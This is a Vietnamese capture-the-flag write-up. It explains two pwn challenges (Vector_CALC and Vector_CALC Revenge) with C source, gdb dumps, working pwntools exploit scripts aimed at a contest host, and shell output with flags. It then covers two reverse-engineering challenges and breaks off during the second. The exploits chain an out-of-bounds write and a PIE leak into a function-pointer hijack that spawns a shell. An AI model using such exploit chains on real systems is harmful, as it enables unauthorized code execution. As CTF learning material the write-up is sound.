## Mini CTF

Tuần vừa rồi mình có tham gia giải mini-CTF về 3 mảng (web, forensics, crypto) của CLB W1, nhưng thật không may, vì không chuyên vào các mảng này và cũng không tiếp xúc nhiều nên mình chỉ làm được 1 ít và dừng chân ở top 11 (khá là tiếc vì chỉ còn 1 chút nữa là mình đã pass kì test). Tuy nhiên, qua bài test đó, mình đã học rất nhiều thứ bổ ích. Tuần này quay trở lại bài test về binary(gồm Pwn và Reverse), bài test gồm 2 bài Pwn và 5 bài Reverse, mình đã hoàn thành 6/7 bài, và thật tiếc khi không đủ time để làm bài cuối

Mình xin trình bày một số bài mà mình đã làm được 

## Pwnable
### 1. Vector_CALC
`Host: nc 45.122.249.68 20017`

`Description: My vector calculator is complete. However, I feel something is not right about this program. Can you find it?`

`Chall file:` [bin](https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/pwn/VectorCALC/src/chall.c), [src](https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/pwn/VectorCALC/chall)

[chall.c](https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/pwn/VectorCALC/src/chall.c)
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#define MAX_FAVES 4
#define MAX_VECTORS 3
struct Vector{
	__uint64_t x;
    __uint64_t y;
    void (*printFunc)(struct Vector*);
};

struct Vector v_list[MAX_VECTORS];
__uint64_t* sum;
void* faves[MAX_FAVES];

void printData(struct Vector* v);

void enterData(){
    struct Vector* v;
    __uint64_t idx;

    printf("Index: ");
    scanf("%lu",&idx);
    
    if(idx > MAX_VECTORS){
        puts("Invaild index!");
        exit(-1);
    }

    v = &v_list[idx];

    v->printFunc = printData;
    printf("Enter x: ");
    scanf("%lu",&v->x);
    printf("Enter y: ");
    scanf("%lu",&v->y);
}


void printData(struct Vector* v){
    puts("Data: ");
    printf("v = [%lu %lu]\n",v->x,v->y);
}

void sumVector(){
    __uint64_t idx;
    printf("Save the sum to index: ");
    scanf("%lu",&idx);
    
    if(idx > MAX_VECTORS){
        puts("Invaild index!");
        exit(-1);
    }

    sum = &v_list[idx];
    for(__uint64_t i = 0 ; i < MAX_VECTORS ;++i){
        if( i != idx){
            ((struct Vector *)sum)->x += v_list[idx].x;
            ((struct Vector *)sum)->y += v_list[idx].y;
        }
    }
}

void loadFavorite(){
    if(sum == NULL){
        puts("You must set the sum before!");
        return;
    }
    __uint64_t idx;

    printf("Index: ");
    scanf("%lu",&idx);
    
    if(idx >= MAX_FAVES){
        puts("Invaild index!");
        exit(-1);
    }

    faves[idx] = malloc(sizeof(struct Vector));

    ((struct Vector *)faves[idx])->printFunc = printData;

    memcpy(faves[idx],&sum[idx], sizeof(struct Vector));
}

void printFavorite(){
    if(sum == NULL){
        puts("You must set the sum before!");
        return;
    }

    __uint64_t idx;

    printf("Index: ");
    scanf("%lu",&idx);
    
    if(idx >= MAX_FAVES || faves[idx] == NULL){
        puts("Invaild index!");
        exit(-1);
    }
    if( ((__uint64_t *)faves[idx])[2] )
        ((struct Vector *)faves[idx])->printFunc(faves[idx]);
    else 
        ((struct Vector *)sum)->printFunc(faves[idx]);
}

void addFavorute(){

    __uint64_t idx;

    printf("Index: ");
    scanf("%lu",&idx);
    
    if(idx >= MAX_FAVES || faves[idx] == NULL){
        puts("Invaild index!");
        exit(-1);
    }

    ((struct Vector *)sum)->x += ((struct Vector *)faves[idx])->x;
    ((struct Vector *)sum)->y += ((struct Vector *)faves[idx])->y;
}

void init(){
    setbuf(stdin,NULL);
    setbuf(stdout,NULL);
    for(__uint64_t i = 0 ; i < MAX_VECTORS ;++i){
        v_list[i].printFunc = printData;
    }
}

void printMenu(){
    printf(
        "\r\n"
        "1. Enter data.\n"
        "2. Sum vector.\n"
        "3. Print sum vector\n"
        "4. Save sum to favorite\n"
        "5. Print favorite\n"
        "6. Add favorite to the sum\n"
        "> "
    );
}

int main(int argc, char** argv, char** envp){
    init();
    __uint32_t choice ;
    while(1){
        printMenu();
        scanf("%u", &choice);
        switch (choice)
        {
        case 1:
            enterData();
            break;
        
        case 2:
            sumVector();
            break;
        
        case 3:
            ((struct Vector *)sum)->printFunc(sum);
            break;

        case 4:
            loadFavorite();
            break;
        
        case 5:
            printFavorite();
            break;
        
        case 6:
            addFavorute();
            break;

        default:
            puts("Invaild option!");
            exit(-1);
        }
    }
}

void w1n(); // try to view the code in a disassembler :)
```

Ban đầu, dùng checksec() để kiểm tra các chế độ bảo vệ của file:

```bash
─   ~/CTF/wannagame/calc                                                                                                       ✘ INT  31m 0s  03:54:35 ─╮
╰─❯ checksec chall                                                                                                                                          ─╯
[*] '/home/w1n-gl0ry/CTF/wannagame/calc/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

:OOPS: , full chế độ được bật :>>>>

Nhìn sơ qua thì ta thấy chương trình khai báo 1 `struct Vector` có dạng gồm 2 số nguyên không dấu và 1 con trỏ đến hàm nhận tham số kiểu (struct Vector*)

```c
struct Vector{
__uint64_t x;
__uint64_t y;
void (*printFunc)(struct Vector*);
};
```

Tiếp tục, mảng `v_list` chứa tối đa 3 phần tử kiểu `Vector`, biến con trỏ `sum` và mảng chứa tối đa 4 con trỏ `faves`

Đến đây thì chưa có gì rõ ràng, ta tiếp tục vào các chức năng chính của chương trình, ta có thể khái quát lại như sau:
   
    Hàm enterData(): Nhập vào index muốn mà mình muốn nhập các chỉ số x, y của struct v , nếu index > 3 -> exit 
    Hàm printData(): Dùng để in ra màn hình 2 chỉ số x, y của struct
    Hàm sumVector(): Dùng để lưu tổng tất cả các chỉ số x, y (không bao gồm chỉ số của index được chọn), index được chọn sẽ là nơi để lưu tổng của các chỉ số x, y
    Hàm loadFavorite(): Nhập vào index của struct mà ta muốn lưu trên heap bằng cách gọi malloc(sizeof(struct Vector)) rồi lưu địa chỉ trên mảng con trỏ faves[index] đã được khai báo đầu chương trình
    Hàm printFavorite(): In ra 2 chỉ số x,y trên heap vừa lưu
    Hàm addFavorute(): cộng vào 2 chỉ số x, y biến con trỏ sum chứa 1 struct của mảng v_list với 2 chỉ số x, y trên heap tại index mà ta nhập vào
    
-> Như đã phân tích trên, chương trình chỉ đơn giản có 6 chức năng, ta tiến hành tìm bug để thực hiện khai thác

Nhìn qua thì có vẻ không có bug gì, nhưng fuzz 1 hồi, mình để ý là ở hàm `enterData()`, chương trình thực hiện check index của mình nhập vào, nhưng lại không check khi index bằng 3 -> Dẫn tới lỗi OOB, dựa vào đó ta có thể ghi đè biến `sum` các địa chỉ hợp lí để có thể khai thác

Mình tiến hành debug bằng `gdb()` để kiểm tra thật sự là mình có thể ghi đè biến sum không, và sau đây là kết quả khi mình nhập index 3:

```bash
09:0048│  0x555555558088 (sum) ◂— 0xdeadbeef
0a:0050│  0x555555558090 ◂— 0xdeadbeef
0b:0058│  0x555555558098 —▸ 0x55555555535d (printData) ◂— endbr64 
```
-> Thật sự, mình có thể ghi đè biến sum, đây là mấu chốt quan trọng để mình thực hiện các bước tiếp theo

Nhưng để viết vào biến `sum` 1 địa chỉ hợp lệ thì trước hết ta phải cần có địa chỉ base của PIE, và cũng có thể leak địa chỉ libc() base nếu chúng ta không có địa chỉ của hàm nào thật sự exploit được trong binary.

Và may mắn thay, mình tìm thấy trong file binary có hàm `w1n()` 

```c
int w1n()
{
  return system("/bin/sh 1>/dev/null");
}
```
-> ta không cần phải leak libc và chúng ta có thể điều khiển 1 con trỏ hàm tới đây để có shell :>>>

Vậy, Làm sao để leak PIE??

Sau 1 hồi lâu mò mẫm thì mình cũng tìm được 1 bug khá là hay trong hàm `loadFavorite()` để có thể leak PIE !

Cùng nhìn lại hàm `loadFavorite()`:

```c
faves[idx] = malloc(sizeof(struct Vector));
((struct Vector *)faves[idx])->printFunc = printData;
memcpy(faves[idx],&sum[idx], sizeof(struct Vector));
```



Nếu index=2, nếu biến `sum` đang chứa địa chỉ của struct thứ 2 trong mảng `v_list` -> `&sum[2] -> v_list+64` hay là `&sum[2]->v_list[8]` và khi thực hiện `memcpy()` thì trên chunk `faves[2]` sẽ chứa địa chỉ hàm `print` trên chỉ số x và địa chỉ của `v_list[2]` trên chỉ số y của chunk `faves[2]`

Hiện thực hóa, điều trên

```
00:0000│  0x555555558040 (v_list) ◂— 0xdeadbeef
01:0008│  0x555555558048 (v_list+8) ◂— 0xdeadbeef
02:0010│  0x555555558050 (v_list+16) —▸ 0x55555555535d (printData) ◂— endbr64 
03:0018│  0x555555558058 (v_list+24) ◂— 0xdeadbeef
04:0020│  0x555555558060 (v_list+32) ◂— 0xdeadbeef
05:0028│  0x555555558068 (v_list+40) —▸ 0x55555555535d (printData) ◂— endbr64 
06:0030│  0x555555558070 (v_list+48) ◂— 0xdeadbeef
07:0038│  0x555555558078 (v_list+56) ◂— 0xdeadbeef
08:0040│  0x555555558080 (v_list+64) —▸ 0x55555555535d (printData) ◂— endbr64 
09:0048│  0x555555558088 (sum) —▸ 0x555555558070 (v_list+48) ◂— 0xdeadbeef
``` 

-> Trên *faves[2] đã chứa các địa chỉ mà ta cần
```
0:0000│  0x5555555592a0 —▸ 0x55555555535d (printData) ◂— endbr64 
01:0008│  0x5555555592a8 —▸ 0x555555558070 (v_list+48) ◂— 0x37ab6fbbc
02:0010│  0x5555555592b0 ◂— 0x0
```

-> Từ đó, khi ta dùng hàm `printFavorite()` thì thứ chúng ta có được đó là địa chỉ của mảng `v_list` và địa chỉ của hàm `print` là ta sẽ có được địa chỉ của PIE

```
Index: 2
Data: 
v = [93824992236381 93824992247920]
```
-> Thành công leak được PIE base 

Bây giờ, ta đã có PIE base, điều cần làm là làm sao điều khiển được RIP trỏ vào hàm `w1n()` 

Options 3 sẽ trả lời câu hỏi của ta:

`((struct Vector *)sum)->printFunc(sum);`

Chúng ta có thể điều khiển biến `sum` trỏ vào bất cứ đâu nhờ vào bug OOB ở trên

Vậy thì chúng ta sẽ viết hàm `w1n()` vào 1 index nào đó trên `v_list()` rồi ghi đè sum trỏ vào trước đó 16 bytes thì chúng ta đã có thể có được shell !!!!!

```c
00:0000│  0x558c60655040 (v_list) —▸ 0x558c606529d2 (w1n) ◂— endbr64 
01:0008│  0x558c60655048 (v_list+8) —▸ 0x558c606529d2 (w1n) ◂— endbr64 
02:0010│  0x558c60655050 (v_list+16) —▸ 0x558c6065235d (printData) ◂— endbr64 
```
Lúc này ghi đè sum bằng v_list[3] thành `v_list-16` sau đó trigger để gọi hàm w1n 

```
0x558c6065298c <main+173>    call   rdx                           <w1n>
        rdi: 0x558c60655030 (stdin@GLIBC_2.2.5) —▸ 0x7fdff7ff6aa0 (_IO_2_1_stdin_) ◂— 0xfbad208b
        rsi: 0x3
        rdx: 0x558c606529d2 (w1n) ◂— endbr64 
        rcx: 0x0
```


Vậy là trên Local mình đã exploit thành công, mình tiến hành gửi lên server thông qua script sau: 
Vector Exploit:
[xpl.py](https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/pwn/VectorCALC/xpl.py)
```py
from pwn import *

#context.log_level='debug'
io=process('./chall')
#io=remote('45.122.249.68', 20017)
elf=context.binary=ELF('./chall')
#gdb.attach(io)

def enter(idx, x, y):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'Index: ', idx)
    io.sendlineafter(b'Enter x: ', x)
    io.sendlineafter(b'Enter y: ', y)
    
def sumVector(idx):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'Save the sum to index: ', idx)
    
def printsum():
    io.sendlineafter(b'> ', b'3')
    
def loadfav(idx):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'Index', idx)
    
def printfav(idx):
    io.sendlineafter(b'> ', b'5')
    io.sendlineafter(b'Index', idx)
    
def addfav(idx):
    io.sendlineafter(b'> ', b'6')
    io.sendlineafter(b'Index', idx)
       
enter(b'0', b'1', b'1')
enter(b'1', b'1', b'1')
enter(b'2', b'1', b'1')

sumVector(b'2')
loadfav(b'2')
printfav(b'2')

io.recvuntil(b'v = [')

leak=io.recvline().strip(b']\n').split()
# print(leak)

pie=int(leak[0])-0x35d
log.info('pie_base :' + hex(pie))

v_list=int(leak[1])-48
log.info('v_list array :' + hex(v_list))

sum=v_list+64
faves=sum+0x18
log.info('sum :' + hex(sum))
log.info('faves :' + hex(faves))

w1n=pie+0x0000000000009D2
system=pie+0x100
log.info('w1n :' + hex(w1n))
log.info('system :' + hex(system))

enter(b'0', str(w1n).encode(), str(w1n).encode())
enter(b'3',str(v_list-16).encode(), str(v_list-16).encode())

printsum() # trigger

#io.sendline(b'exec 1>&0')
io.interactive()
```

spawn shell & get flag:


```bash
─   ~/CTF/wannagame/calc                                                                                                                       02:52:23 ─╮
╰─❯ python3 xpl.py                                                                                                                                          ─╯
[+] Opening connection to 45.122.249.68 on port 20017: Done
[*] '/home/w1n-gl0ry/CTF/wannagame/calc/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] pie_base :0x55a8e7c74000
[*] v_list array :0x55a8e7c77040
[*] sum :0x55a8e7c77080
[*] faves :0x55a8e7c77098
[*] w1n :0x55a8e7c749d2
[*] system :0x55a8e7c74100
[*] Switching to interactive mode
$ exec 1>&0
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$ cd /home/user
$ ls
chall
flag-fe1e4f5e9309c30148cdbb9349cc329eda4186949b59d42041340a5e4657f38a.txt
$ cat flag-fe1e4f5e9309c30148cdbb9349cc329eda4186949b59d42041340a5e4657f38a.txt
W1{Ooops,... Pointers, uint64_t, long long, what the heck are they?}
```
-> `FLAG: W1{Ooops,... Pointers, uint64_t, long long, what the heck are they?}`

### 2. Vector_CALC Revenge 

`Host: nc 45.122.249.68 20018`

`Description: I have fixed the w1n function :)`

 `Chall file:` [chall_revenge](https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/pwn/VectorCALC-Revenge/chall_revenge) 

`chall_revenge.c`

```python
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#define MAX_FAVES 4
#define MAX_VECTORS 3
struct Vector{
	__uint64_t x;
    __uint64_t y;
    void (*printFunc)(struct Vector*);
};

struct Vector v_list[MAX_VECTORS];
__uint64_t* sum;
void* faves[MAX_FAVES];

void printData(struct Vector* v);

void enterData(){
    struct Vector* v;
    __uint64_t idx;

    printf("Index: ");
    scanf("%lu",&idx);
    
    if(idx > MAX_VECTORS){
        puts("Invaild index!");
        exit(-1);
    }

    v = &v_list[idx];

    v->printFunc = printData;
    printf("Enter x: ");
    scanf("%lu",&v->x);
    printf("Enter y: ");
    scanf("%lu",&v->y);
}


void printData(struct Vector* v){
    puts("Data: ");
    printf("v = [%lu %lu]\n",v->x,v->y);
}

void sumVector(){
    __uint64_t idx;
    printf("Save the sum to index: ");
    scanf("%lu",&idx);
    
    if(idx > MAX_VECTORS){
        puts("Invaild index!");
        exit(-1);
    }

    sum = &v_list[idx];
    for(__uint64_t i = 0 ; i < MAX_VECTORS ;++i){
        if( i != idx){
            ((struct Vector *)sum)->x += v_list[idx].x;
            ((struct Vector *)sum)->y += v_list[idx].y;
        }
    }
}

void loadFavorite(){
    if(sum == NULL){
        puts("You must set the sum before!");
        return;
    }
    __uint64_t idx;

    printf("Index: ");
    scanf("%lu",&idx);
    
    if(idx >= MAX_FAVES){
        puts("Invaild index!");
        exit(-1);
    }

    faves[idx] = malloc(sizeof(struct Vector));

    ((struct Vector *)faves[idx])->printFunc = printData;

    memcpy(faves[idx],&sum[idx], sizeof(struct Vector));
}

void printFavorite(){
    if(sum == NULL){
        puts("You must set the sum before!");
        return;
    }

    __uint64_t idx;

    printf("Index: ");
    scanf("%lu",&idx);
    
    if(idx >= MAX_FAVES || faves[idx] == NULL){
        puts("Invaild index!");
        exit(-1);
    }
    if( ((__uint64_t *)faves[idx])[2] )
        ((struct Vector *)faves[idx])->printFunc(faves[idx]);
    else 
        ((struct Vector *)sum)->printFunc(faves[idx]);
}

void addFavorute(){

    __uint64_t idx;

    printf("Index: ");
    scanf("%lu",&idx);
    
    if(idx >= MAX_FAVES || faves[idx] == NULL){
        puts("Invaild index!");
        exit(-1);
    }

    ((struct Vector *)sum)->x += ((struct Vector *)faves[idx])->x;
    ((struct Vector *)sum)->y += ((struct Vector *)faves[idx])->y;
}

void init(){
    setbuf(stdin,NULL);
    setbuf(stdout,NULL);
    for(__uint64_t i = 0 ; i < MAX_VECTORS ;++i){
        v_list[i].printFunc = printData;
    }
}

void printMenu(){
    printf(
        "\r\n"
        "1. Enter data.\n"
        "2. Sum vector.\n"
        "3. Print sum vector\n"
        "4. Save sum to favorite\n"
        "5. Print favorite\n"
        "6. Add favorite to the sum\n"
        "> "
    );
}

int main(int argc, char** argv, char** envp){
    init();
    __uint32_t choice ;
    while(1){
        printMenu();
        scanf("%u", &choice);
        switch (choice)
        {
        case 1:
            enterData();
            break;
        
        case 2:
            sumVector();
            break;
        
        case 3:
            ((struct Vector *)sum)->printFunc(sum);
            break;

        case 4:
            loadFavorite();
            break;
        
        case 5:
            printFavorite();
            break;
        
        case 6:
            addFavorute();
            break;

        default:
            puts("Invaild option!");
            exit(-1);
        }
    }
}

void w1n(); // no more valid parameters to get shell !
```

Ở bài này, tác giả đã sửa lại hàm `w1n()` một chút, ở tham số truyền vào lại là `echo '¯\\_(ツ)_/¯'` nên chúng ta không thể có shell :vv
```c
─   ~/CTF/wannagame/calc                                                                                                                  5s  05:04:50 ─╮
╰─❯ python3 xpl.py                                                                                                                                          ─╯
[+] Opening connection to 45.122.249.68 on port 20018: Done
[*] '/home/w1n-gl0ry/CTF/wannagame/calc/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] pie_base :0x55c01873b000
[*] v_list array :0x55c01873e040
[*] sum :0x55c01873e080
[*] faves :0x55c01873e098
[*] w1n :0x55c01873b9d2
[*] system :0x55c01873b100
[*] Switching to interactive mode
¯\_(ツ)_/¯

```
Quay lại lúc nãy, chúng ta thực thi được hàm `w1n` 

```c
0x558c6065298c <main+173>    call   rdx                           <w1n>
        rdi: 0x558c60655030 (stdin@GLIBC_2.2.5) —▸ 0x7fdff7ff6aa0 (_IO_2_1_stdin_) ◂— 0xfbad208b
        rsi: 0x3
        rdx: 0x558c606529d2 (w1n) ◂— endbr64 
        rcx: 0x0
```

Lúc này chúng ta cần điều khiển thanh ghi `rdi` trỏ đến chuỗi `/bin/sh\0` là được. Lúc gọi con trỏ hàm `((struct Vector *)sum)->printFunc(sum)` tham số của chúng ta là biến `sum`. 


Mà `sum` lúc này đang trỏ đến `v_list-16`, do đó `rdi` chính xác đang trỏ đến `0x558c60655030 (stdin@GLIBC_2.2.5)` như trên hình

Điều chúng ta muốn bây giờ chính là `rdi->/bin/sh ` , `rdx-> w1n`

-> Khá là dễ dàng vì ta chỉ cần ghi vào 2 chunk trên v_list , chỉ số y của chunk này sẽ là `/bin/sh`, chỉ số x của chunk kế tiếp sẽ là địa chỉ hàm `w1n` (cách chính xác 16 bytes), ta sửa sum thành địa chỉ `/bin/sh` là sẽ có được shell

Mọi chuyện đã rõ ràng, ta bắt đầu thực hành:

Mình chỉnh sửa offset hàm w1n ngay chỗ thực hiện `call system` để tránh thanh ghi `rdi` được set cho giá trị rác

```c
00:0000│         0x563e7ff31040 (v_list) ◂— 0x68732f6e69622f /* '/bin/sh' */
01:0008│ rax rdi 0x563e7ff31048 (v_list+8) ◂— 0x68732f6e69622f /* '/bin/sh' */
02:0010│         0x563e7ff31050 (v_list+16) —▸ 0x563e7ff2e35d (printData) ◂— endbr64 
03:0018│         0x563e7ff31058 (v_list+24) —▸ 0x563e7ff2e9e4 (w1n+18) ◂— call 0x563e7ff2e100
04:0020│         0x563e7ff31060 (v_list+32) —▸ 0x563e7ff2e9e4 (w1n+18) ◂— call 0x563e7ff2e100
05:0028│         0x563e7ff31068 (v_list+40) —▸ 0x563e7ff2e35d (printData) ◂— endbr64 
06:0030│         0x563e7ff31070 (v_list+48) ◂— 0x4
07:0038│         0x563e7ff31078 (v_list+56) ◂— 0x4
08:0040│         0x563e7ff31080 (v_list+64) —▸ 0x563e7ff2e35d (printData) ◂— endbr64 
09:0048│         0x563e7ff31088 (sum) —▸ 0x563e7ff31048 (v_list+8) ◂— 0x68732f6e69622f /* '/bin/sh'
```

Vậy `sum -> v_list+8`, khi gọi con trỏ hàm thì `v_list+24->w1n` sẽ được gọi, với `sum` đang chứa địa chỉ chuỗi `/bin/sh`

-> Nhưng không thành công có được shell vì bị stack alignment cả local và remote

-> Mình thử thay thế bằng `system.plt` thì không dính stack aligment và thành công chiếm được shell

Sau đây là script exploit của mình
Vector Exploit:
[xpl.py](https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/pwn/VectorCALC/src/chall.c)

```python
from pwn import *

#context.log_level='debug'
#io=process('./chall_revenge')
io=remote('45.122.249.68', 20018)
elf=context.binary=ELF('./chall_revenge')

#gdb.attach(io)

def enter(idx, x, y):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'Index: ', idx)
    io.sendlineafter(b'Enter x: ', x)
    io.sendlineafter(b'Enter y: ', y)
    
def sumVector(idx):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'Save the sum to index: ', idx)
    
def printsum():
    io.sendlineafter(b'> ', b'3')
    
def loadfav(idx):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'Index', idx)
    
def printfav(idx):
    io.sendlineafter(b'> ', b'5')
    io.sendlineafter(b'Index', idx)
    
def addfav(idx):
    io.sendlineafter(b'> ', b'6')
    io.sendlineafter(b'Index', idx)
    
enter(b'0', b'1', b'1')
enter(b'1', b'1', b'1')
enter(b'2', b'1', b'1')

sumVector(b'2')
loadfav(b'2')
printfav(b'2')

io.recvuntil(b'v = [')

leak=io.recvline().strip(b']\n').split()
# print(leak)

pie=int(leak[0])-0x35d
log.info('pie_base :' + hex(pie))

v_list=int(leak[1])-48
log.info('v_list array :' + hex(v_list))

sum=v_list+64
faves=sum+0x18

log.info('sum :' + hex(sum))
log.info('faves :' + hex(faves))

w1n=pie+0x0000000000009E4
system=pie+0x100
log.info('w1n :' + hex(w1n))
log.info('system :' + hex(system))

bin_sh=0x68732f6e69622f

enter(b'0', str(bin_sh).encode(), str(bin_sh).encode())
enter(b'3',str(v_list+8).encode(), str(v_list+8).encode())

# enter(b'1', str(w1n).encode(), str(w1n).encode())
enter(b'1', str(system).encode(), str(system).encode())

printsum()

io.interactive()
```
spawn shell & get flag:

```bash
─   ~/CTF/wannagame/calc/revenge                                                                                                               02:51:19 ─╮
╰─❯ python3 xpl.py                                                                                                                                          ─╯
[+] Opening connection to 45.122.249.68 on port 20018: Done
[*] '/home/w1n-gl0ry/CTF/wannagame/calc/revenge/chall_revenge'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] pie_base :0x56172c10e000
[*] v_list array :0x56172c111040
[*] sum :0x56172c111080
[*] faves :0x56172c111098
[*] w1n :0x56172c10e9e4
[*] system :0x56172c10e100
[*] Switching to interactive mode
$ id
uid=1001(user_revenge) gid=1001(user_revenge) groups=1001(user_revenge)
$ cd /home/user_revenge
$ ls
chall_revenge
flag-769f85d66029625591d2e6b1bf75c5864b134b2901fa1ef5cf49c2eece7da15a.txt
$ cat flag-769f85d66029625591d2e6b1bf75c5864b134b2901fa1ef5cf49c2eece7da15a.txt
W1{g00d_exploit_idea!!!}
```

-> `FLAG: W1{g00d_exploit_idea!!!}`


## Reverse

### 1. wanna-one vpn

`Description: wanna-one private vpn needs a license key to be authorized, help me intrude their system and I will pay you a fair price!`

`Chall file:` [wanna-one-vpn](https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/rev/wannaone-vpn/wanna-one-vpn)

[vpn.py](https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/rev/wannaone-vpn/vpn.py)

Vì đây là file ELF 64 bit (không bị stripped) nên mình load vào IDA để tiến hành dịch ngược

Nhìn lướt qua assembly thì mình thấy chương trình load vào 1 mảng `encrypted_flag`, nhận `input` ta nhập vào rồi so sánh độ dài 2 mảng bằng hàm `strlen()`

```c
.text:000000000000135B                 mov     eax, [rbp+var_200044]
.text:0000000000001361                 sub     eax, 1
.text:0000000000001364                 cdqe
.text:0000000000001366                 mov     byte ptr [rbp+rax+buf], 0
.text:000000000000136E                 lea     rax, [rbp+buf]
.text:0000000000001375                 mov     rdi, rax        ; s
.text:0000000000001378                 call    _strlen
.text:000000000000137D                 mov     rbx, rax
.text:0000000000001380                 mov     rax, cs:encrypted_flag     -> mảng gồm các kí tự cho trước
.text:0000000000001387                 mov     rdi, rax        ; s
.text:000000000000138A                 call    _strlen
.text:000000000000138F                 cmp     rbx, rax
.text:0000000000001392                 jz      short loc_13B2
.text:0000000000001394                 lea     rax, aInvalidLicense ; "Invalid license key!"
.text:000000000000139B                 mov     rdi, rax        ; format
.text:000000000000139E                 mov     eax, 0
.text:00000000000013A3                 call    _printf
.text:00000000000013A8                 mov     edi, 1          ; status
.text:00000000000013AD                 call    _exit
```

Vậy ta phải nhập vào 1 mảng có kích thước như `encrypted_flag` 24 kí tự

`.rodata:0000000000002004 a8rq9VdVyesv9Em db '^8rq9{Vd:VyesV~9|emVph6t',0`

Tiếp tục, chương trình thực hiện 1 số hành động mà mình có thể dễ dàng dịch ra được:

```c
.text:00000000000013BE loc_13BE:                               ; CODE XREF: main+1BC↓j
.text:00000000000013BE                 mov     rdx, cs:encrypted_flag
.text:00000000000013C5                 mov     eax, [rbp+var_200048]
.text:00000000000013CB                 cdqe
.text:00000000000013CD                 add     rax, rdx
.text:00000000000013D0                 movzx   edx, byte ptr [rax]
.text:00000000000013D3                 mov     eax, [rbp+var_200048]
.text:00000000000013D9                 cdqe
.text:00000000000013DB                 movzx   eax, byte ptr [rbp+rax+buf]
.text:00000000000013E3                 xor     eax, 9
.text:00000000000013E6                 cmp     dl, al
.text:00000000000013E8                 jz      short loc_1408
.text:00000000000013EA                 lea     rax, aInvalidLicense ; "Invalid license key!"
.text:00000000000013F1                 mov     rdi, rax        ; format
.text:00000000000013F4                 mov     eax, 0
.text:00000000000013F9                 call    _printf
.text:00000000000013FE                 mov     edi, 1          ; status
.text:0000000000001403                 call    _exit
.text:0000000000001408 ; ---------------------------------------------------------------------------
.text:0000000000001408
.text:0000000000001408 loc_1408:                               ; CODE XREF: main+17A↑j
.text:0000000000001408                 add     [rbp+var_200048], 1
.text:000000000000140F
.text:000000000000140F loc_140F:                               ; CODE XREF: main+14E↑j
.text:000000000000140F                 mov     eax, [rbp+var_200048]
.text:0000000000001415                 movsxd  rbx, eax
.text:0000000000001418                 mov     rax, cs:encrypted_flag
.text:000000000000141F                 mov     rdi, rax        ; s
```

Chương trình lưu từng byte của mảng `encrypted_flag` vào thanh ghi edx, mảng của chúng ta nhập vào cũng được load qua eax, rồi sau đó thực hiện phép xor với 9. Cuối cùng kiểm tra 2 kí tự có giống nhau không ?

Đến đây đã rõ ràng rồi, mình dùng code python đơn giản sau để mô phỏng lại thuật toán trên.

```python
enc=b'^8rq9{Vd:VyesV~9|emVph6t'
enc=list(enc)
dec=[]
for i in enc:
    dec.append(i^9)
  
print(''.join(chr(i) for i in dec))
```

-> `FLAG: W1{x0r_m3_plz_w0uld_ya?}`

### 2. wanna-one vault
`Description: Hear me out, I disabled the security system so that I could easily dump the vault firmware, now help me decipher the firmware and break into the vault and steal their confidential intels.`

`Chall file:` [wanna-one-vault](https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/rev/wannaone-vault/wanna-one-vault)

[vault.py](https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/rev/wannaone-vault/vault.py)

```c
╭─   ~/CTF/wannagame/chall                                                                                                                            12:02:49 ─╮
╰─❯ file wanna-one-vault                                                                                                                                          ─╯
wanna-one-vault: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=18e2d06b27d74777cea8e784139816bfb61f45d4, for GNU/Linux 3.2.0, not stripped
```

-> Vẫn là 1 file ELF 64 bit (không bị stripped), mình tiến hành load vào `IDA` để dịch ngược

```c
.text:000000000000134C                 lea     rax, [rbp+buf]
.text:0000000000001353                 mov     edx, 30h ; '0'  ; nbytes
.text:0000000000001358                 mov     rsi, rax        ; buf
.text:000000000000135B                 mov     edi, 0          ; fd
.text:0000000000001360                 call    _read
.text:0000000000001365                 mov     [rbp+var_2001D4], eax
.text:000000000000136B                 cmp     [rbp+var_2001D4], 0
.text:0000000000001372                 jg      short loc_137E
.text:0000000000001374                 mov     edi, 1          ; status
.text:0000000000001379                 call    _exit
.text:000000000000137E ; ---------------------------------------------------------------------------
.text:000000000000137E
.text:000000000000137E loc_137E:                               ; CODE XREF: main+104↑j
.text:000000000000137E                 mov     eax, [rbp+var_2001D4]
.text:0000000000001384                 sub     eax, 1
.text:0000000000001387                 cdqe
.text:0000000000001389                 mov     byte ptr [rbp+rax+buf], 0
.text:0000000000001391                 lea     rax, [rbp+buf]
.text:0000000000001398                 mov     rdi, rax        ; s
.text:000000000000139B                 call    _strlen
.text:00000000000013A0                 cmp     rax, 20h ; ' '
.text:00000000000013A4                 jz      short loc_13BF
.text:00000000000013A6                 lea     rax, s          ; "Invalid vault key!"
.text:00000000000013AD                 mov     rdi, rax        ; s
.text:00000000000013B0                 call    _puts
.text:00000000000013B5                 mov     edi, 1          ; status
.text:00000000000013BA                 call    _exit
```

